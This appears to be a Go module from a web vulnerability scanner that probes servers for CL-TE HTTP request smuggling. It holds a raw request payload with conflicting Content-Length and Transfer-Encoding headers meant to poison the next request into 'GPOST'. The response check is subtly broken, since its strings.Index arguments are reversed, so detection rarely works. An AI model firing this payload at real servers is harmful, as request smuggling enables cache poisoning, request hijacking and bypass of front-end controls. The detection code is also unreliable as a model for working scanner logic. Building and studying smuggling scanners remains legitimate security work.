package Smuggling

import (
	"strings"
)

// send tow repeate
var ClTePayload = []string{`POST %s HTTP/1.1
Host: %s
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded%s
Content-Length: 6
Transfer-Encoding: chunked

0

G`}

func init() {
	for n, x := range ClTePayload {
		x = strings.ReplaceAll(x, "\n", "\r\n")
		ClTePayload[n] = x
	}
}

type ClTe struct {
}

func (r *ClTe) CheckResponse(body string) bool {
	return -1 < strings.Index("Unrecognized method GPOST", body)
}
func (r *ClTe) GetVulType() string {
	return "CL-TE"
}
func (r *ClTe) GetPayloads() *[]string {
	return &ClTePayload
}

func (r *ClTe) GetTimes() int {
	return 2
}
